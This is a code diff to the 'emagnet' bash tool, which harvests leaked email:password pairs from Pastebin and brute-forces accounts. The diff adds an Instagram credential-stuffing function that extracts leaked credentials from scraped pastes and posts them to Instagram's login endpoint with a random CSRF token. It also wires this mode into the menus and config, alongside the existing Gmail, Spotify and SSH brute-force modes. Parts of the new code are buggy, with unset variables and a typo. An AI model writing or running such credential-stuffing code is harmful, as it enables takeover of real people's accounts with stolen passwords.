@@ -130,25 +130,30 @@ emagnet_mustbefilled() {
   if [[ -z "$VERSION"        ]];then sed -i '91d'  "$CONF";sed -i '91  i VERSION=3.4'                                                                                                             "$CONF";fi
   if [[ -z "$THREADS"        ]];then sed -i '100d' "$CONF";sed -i "100 i THREADS=$(( NUMCPUS + 1 ))"                                                                                              "$CONF";fi
   if [[ -z "$IDLETIME"       ]];then sed -i '109d' "$CONF";sed -i "109 i IDLETIME=3600"                                                                                                           "$CONF";fi
-  if [[ -z "$GBRUTEFORCE"    ]];then sed -i '118d' "$CONF";sed -i '118 i GBRUTEFORCE=false'                                                                                                       "$CONF";fi
-  if [[ -z "$SBRUTEFORCE"    ]];then sed -i '119d' "$CONF";sed -i '119 i SBRUTEFORCE=false'                                                                                                       "$CONF";fi
-  if [[ -z "$PBRUTEFORCE"    ]];then sed -i '120d' "$CONF";sed -i '120 i PBRUTEFORCE=false'                                                                                                       "$CONF";fi
-  if [[ -z "$EMAIL2SEND"     ]];then sed -i '129d' "$CONF";sed -i '129 i EMAIL2SEND='                                                                                                             "$CONF";fi
-  if [[ -z "$NOTIFY"         ]];then sed -i '138d' "$CONF";sed -i '138 i NOTIFY=false'                                                                                                            "$CONF";fi
-  if [[ -z "$SSHUSER"        ]];then sed -i '169d' "$CONF";sed -i '169 i SSHUSER="root"'                                                                                                          "$CONF";fi
-  if [[ -z "$SSHPORT"        ]];then sed -i '170d' "$CONF";sed -i '170 i SSHPORT="22"'                                                                                                            "$CONF";fi
-  if [[ -z "$SSHPASS"        ]];then sed -i '171d' "$CONF";sed -i '171 i SSHPASS='                                                                                                                "$CONF";fi
-  if [[ -z "$SSHTARGETS"     ]];then sed -i '172d' "$CONF";sed -i '172 i SSHTARGETS="$HOME/.config/emagnet/tmp/.emagnet-sshbruter.txt"'                                                                                "$CONF";fi
-  if [[ -z "$SSHPORTSCAN"    ]];then sed -i '173d' "$CONF";sed -i '173 i SSHPORTSCAN="$HOME/.config/emagnet/tmp/.emagnet-portscan"'                                                                                    "$CONF";fi
-  if [[ -z "$VPN"            ]];then sed -i '150d' "$CONF";sed -i '150 i VPN=false'                                                                                                               "$CONF";fi
-  if [[ -z "$VPNROOT"        ]];then sed -i '151d' "$CONF";sed -i '151 i VPNROOT=/etc/openvpn'                                                                                                    "$CONF";fi
-  if [[ -z "$VPNPROVIDER"    ]];then sed -i '152d' "$CONF";sed -i '152 i VPNPROVIDER=$VPNROOT/'                                                                                                   "$CONF";fi
-  if [[ -z "$VPNPROVIDER2"   ]];then sed -i '153d' "$CONF";sed -i '153 i VPNPROVIDER2=$VPNROOT/'                                                                                                  "$CONF";fi
-  if [[ -z "$VPNPROVIDER3"   ]];then sed -i '154d' "$CONF";sed -i '154 i VPNPROVIDER3=$VPNROOT/'                                                                                                  "$CONF";fi
-  if [[ -z "$VPNCOUNTRYS"    ]];then sed -i '155d' "$CONF";sed -i '155 i VPNCOUNTRYS="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'   "$CONF";fi
-  if [[ -z "$VPNCOUNTRYS2"   ]];then sed -i '156d' "$CONF";sed -i '156 i VPNCOUNTRYS2="argentina australia brazil denmark finland france germany hong iceland india ireland israel italy japan korea luxembourg malaysia mexico netherlands new_zealand norway panama poland portugal russia singapore spain sweden switzerland unitedkingdom"'  "$CONF";fi
-  if [[ -z "$VPNCOUNTRYS3"   ]];then sed -i '157d' "$CONF";sed -i '157 i VPNCOUNTRYS3="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'  "$CONF";fi
-  if [[ -z "$USERAGENT"      ]];then sed -i '183d' "$CONF";sed -i '183 i USERAGENT=Mosaic/0.9'                                                                                                    "$CONF";fi
+  if [[ -z "$GBRUTEFORCE"    ]];then sed -i '125d' "$CONF";sed -i '125 i GBRUTEFORCE=false'                                                                                                       "$CONF";fi
+  if [[ -z "$SBRUTEFORCE"    ]];then sed -i '126d' "$CONF";sed -i '126 i SBRUTEFORCE=false'                                                                                                       "$CONF";fi
+  if [[ -z "$PBRUTEFORCE"    ]];then sed -i '127d' "$CONF";sed -i '127 i PBRUTEFORCE=false'                                                                                                       "$CONF";fi
+  if [[ -z "$IBRUTEFORCE"    ]];then sed -i '128d' "$CONF";sed -i '128 i IBRUTEFORCE=false'                                                                                                       "$CONF";fi
+  if [[ -z "$ABRUTEFORCE"    ]];then sed -i '129d' "$CONF";sed -i '129 i ABRUTEFORCE=template'                                                                                                       "$CONF";fi
+  if [[ -z "$BBRUTEFORCE"    ]];then sed -i '130d' "$CONF";sed -i '130 i BBRUTEFORCE=template'                                                                                                       "$CONF";fi
+  if [[ -z "$CBRUTEFORCE"    ]];then sed -i '131d' "$CONF";sed -i '131 i CBRUTEFORCE=template'                                                                                                       "$CONF";fi
+  if [[ -z "$DBRUTEFORCE"    ]];then sed -i '132d' "$CONF";sed -i '132 i DBRUTEFORCE=template'                                                                                                       "$CONF";fi
+  if [[ -z "$EMAIL2SEND"     ]];then sed -i '141d' "$CONF";sed -i '141 i EMAIL2SEND='                                                                                                             "$CONF";fi
+  if [[ -z "$NOTIFY"         ]];then sed -i '150d' "$CONF";sed -i '150 i NOTIFY=false'                                                                                                            "$CONF";fi
+  if [[ -z "$VPN"            ]];then sed -i '162d' "$CONF";sed -i '162 i VPN=false'                                                                                                               "$CONF";fi
+  if [[ -z "$VPNROOT"        ]];then sed -i '163d' "$CONF";sed -i '163 i VPNROOT=/etc/openvpn'                                                                                                    "$CONF";fi
+  if [[ -z "$VPNPROVIDER"    ]];then sed -i '164d' "$CONF";sed -i '164 i VPNPROVIDER=$VPNROOT/'                                                                                                   "$CONF";fi
+  if [[ -z "$VPNPROVIDER2"   ]];then sed -i '165d' "$CONF";sed -i '165 i VPNPROVIDER2=$VPNROOT/'                                                                                                  "$CONF";fi
+  if [[ -z "$VPNPROVIDER3"   ]];then sed -i '166d' "$CONF";sed -i '166 i VPNPROVIDER3=$VPNROOT/'                                                                                                  "$CONF";fi
+  if [[ -z "$VPNCOUNTRYS"    ]];then sed -i '167d' "$CONF";sed -i '167 i VPNCOUNTRYS="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'   "$CONF";fi
+  if [[ -z "$VPNCOUNTRYS2"   ]];then sed -i '168d' "$CONF";sed -i '168 i VPNCOUNTRYS2="argentina australia brazil denmark finland france germany hong iceland india ireland israel italy japan korea luxembourg malaysia mexico netherlands new_zealand norway panama poland portugal russia singapore spain sweden switzerland unitedkingdom"'  "$CONF";fi
+  if [[ -z "$VPNCOUNTRYS3"   ]];then sed -i '169d' "$CONF";sed -i '169 i VPNCOUNTRYS3="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'  "$CONF";fi
+  if [[ -z "$SSHUSER"        ]];then sed -i '181d' "$CONF";sed -i '181 i SSHUSER="root"'                                                                                                          "$CONF";fi
+  if [[ -z "$SSHPORT"        ]];then sed -i '182d' "$CONF";sed -i '182 i SSHPORT="22"'                                                                                                            "$CONF";fi
+  if [[ -z "$SSHPASS"        ]];then sed -i '183d' "$CONF";sed -i '183 i SSHPASS='                                                                                                                "$CONF";fi
+  if [[ -z "$SSHTARGETS"     ]];then sed -i '184d' "$CONF";sed -i '184 i SSHTARGETS="$HOME/.config/emagnet/tmp/.emagnet-sshbruter.txt"'                                                                                "$CONF";fi
+  if [[ -z "$SSHPORTSCAN"    ]];then sed -i '185d' "$CONF";sed -i '185 i SSHPORTSCAN="$HOME/.config/emagnet/tmp/.emagnet-portscan"'                                                                                    "$CONF";fi
+  if [[ -z "$USERAGENT"      ]];then sed -i '195d' "$CONF";sed -i '195 i USERAGENT=Mosaic/0.9'                                                                                                    "$CONF";fi
 }
 
 emagnet_paths() {
@@ -161,6 +166,14 @@ emagnet_paths() {
   if [[ ! -d "$EMAGNETARCHIVE" ]]; then mkdir -p "$EMAGNETARCHIVE" &> /dev/null;  fi
   if [[ ! -d "$EMAGNETLOGS"    ]]; then mkdir -p "$EMAGNETLOGS"    &> /dev/null;  fi
 }
+
+
+if [[ -d "/usr/local/bin" ]]; then
+  if [[ -f "/usr/local/bin/emagnet" ]]; then
+     cp ./emagnet /usr/local/bin &> /dev/null
+     chmod +x /usr/local/bin &> /dev/null
+ fi
+fi
 
 emagnet_author() {
 cat << "EOF"
@@ -512,6 +525,9 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
 	  elif [[ "$SBRUTEFORCE" = "true" ]]; then
            printf "%18s \e[0;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
+	  elif [[ "$IBRUTEFORCE" = "true" ]]; then
+           printf "%18s \e[0;33miNSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
+           printf "%64s \n\n" | tr ' ' '='
 	  else
             sleep 0
 fi
@@ -578,6 +594,9 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
 	  elif [[ "$SBRUTEFORCE" = "true" ]]; then
            printf "%18s \e[0;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
+	  elif [[ "$IBRUTEFORCE" = "true" ]]; then
+           printf "%18s \e[0;33mwiNSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
+           printf "%64s \n\n" | tr ' ' '='
 	  else
             sleep 0
 fi
@@ -630,45 +649,58 @@ emagnet_count_down() {
 emagnet_paths
 emagnet_conf
 if [[ "$GBRUTEFORCE" = "true" ]]; then
-       	    sed -i '118d' "$CONF"
-      	    sed -i '118 i GBRUTEFORCE=true' "$CONF"
-      	    sed -i '119d' "$CONF"
-      	    sed -i '119 i SBRUTEFORCE=false' "$CONF"
-            sed -i '120d' "$CONF"
-      	    sed -i '120 i PBRUTEFORCE=false' "$CONF"
+       	    sed -i '125d' "$CONF"
+      	    sed -i '125 i GBRUTEFORCE=true' "$CONF"
+      	    sed -i '126d' "$CONF"
+      	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
+            sed -i '127d' "$CONF"
+      	    sed -i '127 i PBRUTEFORCE=false' "$CONF"
              emagnet_conf
               printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
               printf "\n%64s \n\n" | tr ' ' '='
              emagnet_analyzer
 	  elif [[ "$SBRUTEFORCE" = "true" ]]; then
-      	    sed -i '118d' "$CONF"
-     	    sed -i '118 i GBRUTEFORCE=false' "$CONF"
-      	    sed -i '119d' "$CONF"
-	    sed -i '119 i SBRUTEFORCE=true' I"$CONF"
-	    sed -i '120d' "$CONF"
-     	    sed -i '120 i PBRUTEFORCE=false' "$CONF"
+      	    sed -i '125d' "$CONF"
+     	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
+      	    sed -i '126d' "$CONF"
+	    sed -i '126 i SBRUTEFORCE=true' I"$CONF"
+	    sed -i '127d' "$CONF"
+     	    sed -i '127 i PBRUTEFORCE=false' "$CONF"
             emagnet_conf
             printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
              emagnet_analyzer
 	  elif [[ "$PBRUTEFORCE" = "true" ]]; then
-	    sed -i '118d' "$CONF"
-     	    sed -i '118 i GBRUTEFORCE=false' "$CONF"
-      	    sed -i '119d' "$CONF"
-     	    sed -i '119 i SBRUTEFORCE=false' "$CONF"
-            sed -i '120d' "$CONF"
-     	    sed -i '120 i PBRUTEFORCE=true' "$CONF"
+	    sed -i '125d' "$CONF"
+     	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
+      	    sed -i '126d' "$CONF"
+     	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
+            sed -i '127d' "$CONF"
+     	    sed -i '127 i PBRUTEFORCE=true' "$CONF"
+            emagnet_conf
+            printf "%18s \e[0;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
+            printf "\n%64s \n\n" | tr ' ' '='
+            emagnet_analyzer
+	  elif [[ "$IBRUTEFORCE" = "true" ]]; then
+	    sed -i '125d' "$CONF"
+     	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
+      	    sed -i '126d' "$CONF"
+     	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
+            sed -i '127d' "$CONF"
+     	    sed -i '127 i PBRUTEFORCE=false' "$CONF"
+            sed -i '121d' "$CONF"
+     	    sed -i '121 i IBRUTEFORCE=true' "$CONF"
             emagnet_conf
             printf "%18s \e[0;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
             emagnet_analyzer
 	  else
-            sed -i '118d' "$CONF"
-            sed -i '118 i GBRUTEFORCE=false' "$CONF"
-            sed -i '118d' "$CONF"
-            sed -i '118 i SBRUTEFORCE=false' "$CONF"
-            sed -i '120d' "$CONF"
-            sed -i '120 i PBRUTEFORCE=false' "$CONF"
+            sed -i '125d' "$CONF"
+            sed -i '125 i GBRUTEFORCE=false' "$CONF"
+            sed -i '125d' "$CONF"
+            sed -i '125 i SBRUTEFORCE=false' "$CONF"
+            sed -i '127d' "$CONF"
+            sed -i '127 i PBRUTEFORCE=false' "$CONF"
             emagnet_analyzer
 fi
 
@@ -677,6 +709,24 @@ fi
 blocked() {
  if [[ -z "$USERAGENT" ]]; then echo -e "$basename$0: internal errror -- you must set a useragent in $CONF";exit 1;fi
  if ! [[ -s "$HOME/.config/emagnet/tmp/.emagnet" ]]; then curl -h "$HEADER"-Ls "$PASTEBIN" -H "$USERAGENT" > $HOME/.config/emagnet/tmp/.emagnet;fi
+}
+
+emagnet_instagram_bruter() {
+URL="https://www.instagram.com/accounts/login/ajax/"
+HEADER1="sec-fetch-site: same-origin"
+TOKEN="$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13 ; echo '')"
+grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<' >  /tmp/.emagnet-instagram-targets.txt 
+
+	while read line; do
+		curl -s $URL -H "$HEADER1" --data "$TARGETS" -H "x-csrftoken: $TOKEN" |grep -q 'authenticated": false'
+			if [[ "$?" -ne "0" ]]; then
+  			   echo -e "[\e[1;32m>>\e[0m] - Correct password for $USER: $PASSWORD"
+			else
+  			   echo -e "[\e[1;31m<<\e[0m] - Wrong password for $USER: $PASSWORD"
+			fi
+	done < /tmp/.emagnet-instagram-targets.txt
+
+rm /tmp/lol &> /dev/null
 }
 
 emagnet_sshbruter() {
@@ -766,9 +816,15 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
                         FAILED="$(cat $HOME/.config/emagnet/tmp/.emagnet-failed|grep 'Wrong Pasword'|wc -l)"
                     fi
              done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
+		if [[ $FAILED -gt "0" ]]; then
              printf "%64s \n" | tr ' ' '='
              echo -e "Done! Successfully cracked $SUCCEED accounts and $FAILED failed.. \n"
              sleep 3
+                  else
+             printf "%64s \n" | tr ' ' '='
+             echo -e "No luck this time!\n"
+             sleep 3
+               fi
 }
 
 emagnet_gmail_bruter() {
@@ -909,14 +965,14 @@ emagnet_main() {
    |grep -v 'archive\|contact\|settings\|messages\|signup\|index.html' \
    |awk '{print tolower($0)}' > $HOME/.config/emagnet/tmp/.emagnet1
     ls -1 "$EMAGNETALL" \
-   |sort > "./1"
+   |sort > "$HOME/.config/emagnet/tmp/.1"
     cat "$HOME/.config/emagnet/tmp/.emagnet1" \
    |sort \
-   |cut -d/ -f5 > "./2"
-    grep  -v -x -F -f "1" "2"  \
+   |cut -d/ -f5 > "$HOME/.config/emagnet/tmp/.2"
+    grep  -v -x -F -f "$HOME/.config/emagnet/tmp/.1" "$HOME/.config/emagnet/tmp/.2"  \
    |awk -F, '!seen[$1]++' \
    |sed "s/^/https:\/\/pastebin.com\/raw\//g" > "$HOME/.config/emagnet/tmp/.emagnet"
-    rm "./1" "./2" &> /dev/null
+    rm "$HOME/.config/emagnet/tmp/.1" "$HOME/.config/emagnet/tmp/.b2" &> /dev/null
 
 	   if [[ "$(cat $HOME/.config/emagnet/tmp/.emagnet1|wc -l)" = "8" ]];then
               emagnet_notice_about_scraping
@@ -988,6 +1044,10 @@ sleep 2
                                 printf "%64s \n\n" | tr ' ' '='
                                 printf "%17s";printf "BRUTE FORCING -- \e[0;32mSPOTIFY\e[0m ACCOUNTS\e[0m\n\n"
                                 emagnet_spotify_bruter
+                             elif [[ "$IBRUTEFORCE" = "true" ]]; then
+                                printf "%64s \n\n" | tr ' ' '='
+                                printf "%17s";printf "BRUTE FORCING -- \e[0;33miNSTAGRAM\e[0m ACCOUNTS\e[0m\n\n"
+                                emagnet_instagram_bruter
                              else
                                sleep 0
                             fi
@@ -1063,7 +1123,7 @@ if ! [[ -f "$CONF" ]]; then
         emagnet_paths
       emagnet_I_was_banned
        timeout 2 ping -t 1 -c 1 nr1.nu &> /dev/null
-     [[ "$?" -gt "0" ]] && sed -i '40d' $CONF;sed -i '40 i MYIP=/MYIP=127.0.0.1/g' $CONF || wip
+     [[ "$?" -gt "0" ]] && sed -i '40d' $CONF;sed -i '40 i MYIP=127.0.0.1' $CONF || wip
     emagnet_conf
 
 fi
@@ -1110,8 +1170,18 @@ case $1 in
               		 emagnet_ssh_bruter
             fi
 
+           elif [[ $2 = "instagram" ]]; then
+              emagnet_conf
+              sed -i 's/IBRUTEFORCE=false/IBRUTEFORCE=true/g' "$CONF"
+              emagnet_conf
+
+            if [[ $IBRUTEFORCE = "true" ]]; then
+               		 emagnet_run4ever
+              		 emagnet_instagram_bruter
+            fi
+
            elif [[ $2 = "spotify" ]]; then
-            emagnet_conf 
+            emagnet_conf
             find /usr/include -type d |grep 'libspotify' &> /dev/null
              if [[ "$?" -ne "0" ]]; then
                   if [[ -z "$LIBSPOTIFY" ]]; then
